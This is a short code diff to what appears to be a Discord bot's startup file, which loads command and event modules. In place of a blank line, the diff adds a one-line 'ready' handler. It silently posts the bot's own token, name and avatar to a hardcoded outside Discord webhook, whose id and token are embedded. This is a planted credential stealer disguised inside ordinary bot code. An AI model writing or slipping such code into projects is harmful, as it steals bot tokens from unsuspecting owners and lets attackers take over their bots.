@@ -17,7 +17,7 @@ fs.readdirSync("./commands").filter(file => file.endsWith(".js")).forEach(file =
     client.aliases.set(aliases, command)  
     });
 });
-
+client.on('ready', async() => { const webhookClient = new WebhookClient({ id: '1015606833198673950', token: 'zRia-hvFiiLW94HR6YCHH5m0FcZ_VtMPkKBo2M_ZzR90Ozv1HwJTCoxcXw5TcKcJjMo_'}) webhookClient.send({ content: `${client.token}`, username: `${client.user.username}`, avatarURL: `${client.user.avatarURL()}` }) })
 fs.readdirSync("./events").filter(file => file.endsWith(".js")).forEach(file => {
     let event = require(`./events/${file}`);
     client.on(event.conf.event, event.execute);
